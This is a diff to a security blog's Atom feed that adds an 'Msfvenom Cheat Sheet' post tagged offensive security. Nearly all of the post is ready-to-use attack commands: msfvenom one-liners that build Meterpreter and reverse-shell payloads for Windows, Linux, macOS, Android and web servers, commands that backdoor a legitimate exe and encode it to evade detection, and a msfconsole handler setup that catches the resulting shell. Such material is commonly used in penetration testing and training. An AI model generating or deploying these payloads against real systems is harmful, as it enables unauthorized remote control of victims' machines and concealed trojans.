@@ -5,7 +5,7 @@
   
   <link href="https://nitesculucian.github.io/feed.xml" rel="self" type="application/atom+xml" />
   <link href="https://nitesculucian.github.io/" rel="alternate" type="text/html" hreflang="en" />
-  <updated>2018-07-23T15:24:54-03:00</updated>
+  <updated>2018-07-24T19:16:59-03:00</updated>
   <id>https://nitesculucian.github.io//</id>
 
   
@@ -24,6 +24,156 @@
     </author>
   
 
+  
+  
+    <entry>
+      
+      <title type="html">Msfvenom Cheat Sheet</title>
+      
+      
+      <link href="https://nitesculucian.github.io/2018/07/24/msfvenom-cheat-sheet/" rel="alternate" type="text/html" title="Msfvenom Cheat Sheet" />
+      
+      <published>2018-07-24T18:58:00-03:00</published>
+      <updated>2018-07-24T18:58:00-03:00</updated>
+      <id>https://nitesculucian.github.io/2018/07/24/msfvenom-cheat-sheet</id>
+      <content type="html" xml:base="https://nitesculucian.github.io/2018/07/24/msfvenom-cheat-sheet/">&lt;p&gt;&lt;img src=&quot;/uploads/Screenshot%20from%202018-07-25%2001-11-02.png&quot; alt=&quot;Image of Nebula Terminal&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;MsfVenom is a Metasploit standalone payload generator as replacement for msfpayload and msfencode.&lt;/p&gt;
+
+&lt;h2 id=&quot;binaries&quot;&gt;Binaries&lt;/h2&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Command&lt;/th&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;Info&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f exe &amp;gt; example.exe&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Creates a simple TCP Payload for Windows&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;msfvenom -p windows/meterpreter/reverse_http LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f exe &amp;gt; example.exe&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Creates a simple HTTP Payload for Windows&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f elf &amp;gt; example.elf&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Creates a simple TCP Shell for Linux&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;msfvenom -p osx/x86/shell_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f macho &amp;gt; example.macho&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Creates a simple TCP Shell for Mac&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;msfvenom -p android/meterpreter/reverse/tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} R &amp;gt; example.apk&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Creats a simple TCP Payload for Android&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;web-payloads&quot;&gt;Web Payloads&lt;/h2&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Command&lt;/th&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;Info&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;msfvenom -p php/meterpreter_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f raw &amp;gt; example.php&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Creats a Simple TCP Shell for PHP&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f asp &amp;gt; example.asp&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Creats a Simple TCP Shell for ASP&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;msfvenom -p java/jsp_shell_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f raw &amp;gt; example.jsp&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Creats a Simple TCP Shell for Javascript&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;msfvenom -p java/jsp_shell_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f war &amp;gt; example.war&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Creats a Simple TCP Shell for WAR&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;windows-payloads&quot;&gt;Windows Payloads&lt;/h2&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Command&lt;/th&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;Info&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;msfvenom -l encoders&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Lists all avalaible encoders&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;msfvenom -x base.exe -k -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f exe &amp;gt; example.exe&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Binds an exe with a Payload (Backdoors an exe)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -e x86/shikata_ga_nai -b ‘\x00’ -i 3 -f exe &amp;gt; example.exe&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Creates a simple TCP payload with shikata_ga_nai encoder&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;msfvenom -x base.exe -k -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -e x86/shikata_ga_nai -i 3 -b “\x00” -f exe &amp;gt; example.exe&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Binds an exe with a Payload and encodes it&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h3 id=&quot;how-do-i-get-the-meterprater-shell&quot;&gt;How do I get the meterprater shell?&lt;/h3&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nli@nlistation:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;msfconsole
+msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use exploit/multi/handler
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/handler&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;payload windows/meterpreter/reverse_tcp
+payload &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; windows/meterpreter/reverse_tcp
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/handler&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;lhost 192.168.1.123
+lhost &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 192.168.1.123
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/handler&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;lport 4444
+lport &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 4444
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/handler&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; run
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content>
+
+      
+      
+      
+      
+      
+
+      
+        <author>
+            <name>Lucian Nitescu</name>
+          
+          
+        </author>
+      
+
+      
+        <category term="cheatsheet" />
+      
+        <category term="offensive_security" />
+      
+
+      
+
+      
+        <summary type="html"></summary>
+      
+
+      
+      
+    </entry>
+  
   
   
     <entry>
